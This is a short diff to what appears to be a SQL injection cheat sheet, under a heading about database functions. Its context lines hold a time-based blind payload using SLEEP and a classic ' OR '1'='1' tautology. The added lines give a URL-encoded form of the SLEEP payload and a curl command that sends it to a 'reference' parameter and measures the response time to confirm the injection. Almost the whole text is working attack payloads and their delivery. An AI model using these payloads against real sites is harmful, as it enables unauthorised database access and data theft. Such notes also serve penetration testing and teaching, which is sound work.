@@ -49,6 +49,8 @@ Using Database Functions:
 
 reference=123' OR IF(1=1,SLEEP(2),0) -- -
 
+payload="123'%20OR%20IF(1=1,SLEEP(2),0)%20--%20-"
+curl -s -o /dev/null -w "%{time_total}\n" "https://example.com/logo.php?reference=${payload}"
 
 
 ' OR '1'='1'; --
